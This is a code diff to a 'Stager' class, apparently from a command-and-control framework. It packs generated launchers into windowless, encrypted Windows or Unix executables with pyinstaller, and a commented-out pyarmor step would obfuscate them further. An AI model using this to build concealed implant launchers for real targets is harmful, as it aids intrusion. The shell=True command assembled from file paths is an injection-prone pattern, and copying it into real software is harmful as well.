@@ -37,8 +37,8 @@ class Stager(object):
             "ListenerBuild": {
                 "Description": "Destination OS for launcher.",
                 "Required": True,
-                "Value": "Win",
-                "SuggestedValues": ["Win", "Unix", "MacOs"],
+                "Value": "Windows",
+                "SuggestedValues": ["Windows", "Unix"],
             },
             "BinaryFile": {
                 "Description": "File to output launcher to.",
@@ -113,6 +113,13 @@ class Stager(object):
             text_file.write(f"{launcher}")
 
         log.info(f"Created {binary_file_str}.py")
+        import secrets
+        if 'win' in listener_build.lower():
+            log.info(f"Packing {binary_file_str}.py to exe file")
+            pyinstaller = 'wine pyinstaller'
+        else:
+            log.info(f"Packing {binary_file_str}.py to bin file")
+            pyinstaller = 'pyinstaller'
         # ico = 'app.ico'
         # xec = f'pyarmor-7 pack --clean --name={secrets.token_hex(8)} ' \
         #       f'-e " --onefile --noupx --noconsole --key {secrets.token_hex(8)} " ' \
@@ -133,28 +140,16 @@ class Stager(object):
         #         f'{binary_file_str}.py',
         #     ]
         # )
-        log.info(f"Created {binary_file_str}.py")
-        import secrets
-        subprocess.run(
-            [
-                'pyinstaller',
-                f'{binary_file_str}.py',
-                '-y',
-                '-F',
-                '--clean',
-                '--noupx',
-                '--noconsole',
-                f'--key {secrets.token_hex(8)}',
-                '--specpath',
-                os.path.dirname(binary_file_str),
-                '--distpath',
-                os.path.dirname(binary_file_str),
-                '--workpath',
-                f"/tmp/{str(time.time())}-build/"
-            ]
-        )
+        command = (f'{pyinstaller} {binary_file_str}.py -y -F --clean --noupx --noconsole '
+                   f'--key {secrets.token_hex(8)} '
+                   f'--specpath {os.path.dirname(binary_file_str)} '
+                   f'--distpath {os.path.dirname(binary_file_str)} '
+                   f'--workpath /tmp/{str(time.time())}-build/')
+        # log.warning(command)
+        subprocess.run(command, shell=True, capture_output=True, text=True)
 
-        with open(binary_file_str, "rb") as f:
-            exe = f.read()
-
-        return exe
+        if os.path.exists(binary_file_str):
+            with open(binary_file_str, "rb") as f:
+                return f.read()
+        log.error("Error in launcher generation.")
+        return ""
